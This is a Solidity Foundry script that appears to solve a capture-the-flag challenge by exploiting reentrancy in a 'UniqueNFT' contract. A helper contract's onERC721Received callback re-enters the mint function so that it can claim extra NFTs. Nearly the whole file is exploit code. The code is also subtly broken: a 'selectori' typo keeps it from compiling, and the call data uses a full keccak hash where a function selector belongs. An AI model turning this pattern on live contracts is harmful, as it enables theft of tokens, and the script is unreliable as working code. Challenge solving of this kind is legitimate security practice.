// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Script, console} from "forge-std/Script.sol";
import { UniqueNFT } from "../src/UniqueNFT.sol";

contract Helper {


	address instanceAddr;
	UniqueNFT public instance;
	address master;

	constructor (address _addr) payable {
		instanceAddr = _addr;
		instance = UniqueNFT(_addr);
		master = msg.sender;
	}

	function onERC721Received(
	        address operator,
	        address from,
	        uint256 tokenId,
	        bytes calldata data
	) external returns (bytes4)
	{
		// msg.sender.mintNFTSmartContract()
		
		if (instance.tokenId() == 3)
			return (this.onERC721Received.selector);
		instanceAddr.call{value: 0 ether}(bytes.concat(keccak256("mintNFTSmartContract()")));
		return this.onERC721Received.selectori;
	}

}

contract UniqueNFTSolver is Script {

	// UniqueNFT public instance = UniqueNFT(0x6b4DDbd0bdb3332f4B9512789fA827826Ccbaa88);

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

	function run() external {
		vm.startBroadcast(prv);


		// using mintNFTSmartContract as reentrancy endpoint is impossible because it is protected by the ReentrancyGuard
		// using mintNFTEOA on the other hand is not practical because EOA cant have callback implementation 
		// that is why we need our contract Helper to act as EOA, this solves our problems
		UniqueNFT instance = new UniqueNFT();
		Helper helper = new Helper{value: 2 ether}(address(instance));

		console.log(instance.balanceOf(me));
		console.log(instance.balanceOf(address(helper)));
		
		helper.onERC721Received(address(0), address(0), 0, "");

		console.log(instance.balanceOf(me));
		console.log(instance.balanceOf(address(helper)));

		vm.stopBroadcast();
	
	}

}

